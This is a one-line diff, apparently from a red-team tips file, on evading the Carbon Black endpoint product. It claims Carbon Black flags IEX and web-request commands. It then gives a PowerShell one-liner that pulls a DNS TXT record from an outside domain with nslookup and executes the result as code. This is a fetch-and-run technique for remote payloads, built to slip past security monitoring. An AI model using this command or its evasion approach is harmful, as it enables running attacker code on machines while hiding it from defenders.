@@ -1,0 +1,1 @@
+Carbon Black checks for IEX and web req commands. Use powershell powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]
